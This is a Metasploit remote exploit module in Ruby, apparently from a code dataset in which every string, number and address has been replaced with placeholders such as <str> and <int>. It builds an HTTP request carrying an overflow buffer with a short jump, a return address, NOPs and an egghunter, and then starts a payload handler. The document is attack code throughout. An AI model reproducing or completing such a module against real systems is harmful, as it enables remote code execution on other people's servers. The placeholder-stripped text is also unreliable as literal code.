require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: Remote :: Egghunter def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > true , <str> = > { <str> = > <str> , <str> = > Msf :: Encoder :: Type :: AlphanumMixed , <str> = > { <str> = > <str> } , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > <int> , <str> = > <str> ) ) end def exploit opts = { <str> = > true } hunter , p = generate_egghunter ( payload . encoded , payload_badchars , opts ) sploit = rand_text_alpha_upper ( <int> ) sploit [ <int> , <int> ] = Rex :: Arch :: X86 . jmp_short ( <int> ) sploit [ <int> , <int> ] = [ target . ret ] . pack ( <str> ) sploit [ <int> , <int> ] = make_nops ( <int> ) sploit [ <int> , hunter . length ] = hunter print_status ( <str> target . name <str> ) req = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > sploit + <str> , <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > p } } , <int> ) select ( nil , nil , nil , <int> ) handler end end 
